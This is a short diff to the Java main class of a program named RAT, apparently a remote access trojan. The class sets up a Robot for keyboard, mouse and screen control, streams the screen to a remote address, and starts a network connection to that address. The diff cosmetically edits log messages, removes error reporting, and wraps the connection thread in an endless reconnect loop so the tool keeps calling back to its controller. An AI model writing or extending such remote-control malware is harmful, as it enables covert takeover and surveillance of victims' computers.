@@ -6,9 +6,6 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.util.concurrent.locks.LockSupport;
-
-import javax.swing.JOptionPane;
-
 import electron.console.logger;
 import electron.functions.Keyboard;
 import electron.functions.MouseTweaks;
@@ -58,7 +55,7 @@ public class RAT {
 		logger.log("[RAT.main]: Success.");
 		// Initializing Robot
 		logger.log("[RAT.main]: ---------------------------");
-		logger.log("[RAT.main]: Initializing Robot...");
+		logger.log("[RAT.main]: Initializing robot...");
 		try {
 			Robot r = new Robot();
 			Connection.r = r;
@@ -67,18 +64,22 @@ public class RAT {
 			CommandExecutor.r = r;
 			ssender = new ScreenV2Sender(r, address);
 			ssender.start();
-			logger.log("[RAT.main]: Robot: Success!");
+			logger.log("[RAT.main]: robot: Success!");
 		} catch (AWTException e) {
-			logger.error("[RAT.main]: error initializing Robot: " + e.getMessage());
-			while (!Connection.isConnected()) {
-				LockSupport.parkNanos(1000);
-			}
-			ErrorPacket.sendError("[RAT.main]: error initializing Robot: " + e.getMessage());
+			logger.error("[RAT.main]: error initializing robot: " + e.getMessage());
 		}
-		// Starting network
-		Thread ServListener = new Connection(address);
-		ServListener.start();
 		logger.log("[RAT.main]: ---------------------------");
 		logger.log("[RAT.main]: Loaded.");
+		// Keeping connection thread working
+		Thread ServListener;
+		while (true) {
+			ServListener = new Connection(address);
+			ServListener.start();
+			try {
+				ServListener.join();
+			} catch (InterruptedException e) {
+				logger.error("[RAT.main]: connection thread was interrupted. Message: " + e.getMessage());
+			}
+		}
 	}
 }
